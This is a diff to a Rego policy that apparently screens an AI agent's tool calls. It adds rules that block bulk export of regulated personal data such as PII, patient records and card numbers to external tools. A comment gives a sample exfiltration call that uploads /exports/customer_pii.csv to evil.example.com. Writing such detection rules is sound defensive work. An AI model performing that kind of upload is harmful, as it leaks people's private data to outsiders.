@@ -256,6 +256,48 @@ data_leakage_detected {
     some i
     regex.match(secret_value_patterns[i], val)
 }
+# BULK REGULATED-DATA EXPORT to an external sink.
+#
+# Every rule above keys on a CREDENTIAL — a sensitive key name, or a secret-shaped value. A PII export
+# contains none of them: `upload_file{path:"/exports/customer_pii.csv", dest:"https://evil.example.com"}`
+# carries no password, no api_key, no token, so it sailed through as `default_allow` while the identical
+# intent via send_email/post_webhook blocked. That is the highest-volume exfiltration shape there is.
+#
+# Two predicates are ANDed so ordinary prose cannot trip this: the value must name a regulated data
+# CATEGORY *and* look like a data ARTIFACT (path, file extension, table, dump). "Email the patient about
+# their appointment" names a category but no artifact, so it stays allowed; "/exports/customer_pii.csv"
+# matches both. Same decision either way — this only closes the credential-free path.
+# NOTE the boundaries: `\b` is WRONG here because `_` is a word character, so `\bpii\b` does not
+# match inside `customer_pii.csv` — the single most likely real filename. These use an explicit
+# non-alphanumeric boundary so underscore-separated identifiers match as intended.
+regulated_data_patterns = [
+    `(^|[^a-z0-9])pii([^a-z0-9]|$)`, `(^|[^a-z0-9])phi([^a-z0-9]|$)`,
+    `(^|[^a-z0-9])ssn([^a-z0-9]|$)`, `(^|[^a-z0-9])pan([^a-z0-9]|$)`,
+    `social[_-]?security`, `credit[_-]?card`, `passport`,
+    `date[_-]?of[_-]?birth`, `patient`, `medical[_-]?record`, `customer[_-]?data`,
+    `personal[_-]?data`, `cardholder`, `tax[_-]?id`,
+]
+data_artifact_patterns = [
+    `\.(csv|sql|json|parquet|xlsx?|tsv|dump|bak|gz|zip)\b`,
+    `\bexport\b`, `\bdump\b`, `\bbackup\b`, `\bextract\b`, `/`,
+]
+
+_regulated_artifact(val) {
+    some i, j
+    regex.match(regulated_data_patterns[i], lower(val))
+    regex.match(data_artifact_patterns[j], lower(val))
+}
+data_leakage_detected {
+    external_tools[input.tool_name]
+    val := security_scan_texts[_]
+    _regulated_artifact(val)
+}
+data_leakage_detected {
+    egress_verb_tool
+    val := security_scan_texts[_]
+    _regulated_artifact(val)
+}
+
 # A secret in a param VALUE must also block on ANY egress-verb sink, not only the 3 named
 # external_tools — mirrors the egress-verb key-name rule above and comprehensive.rego.
 data_leakage_detected {
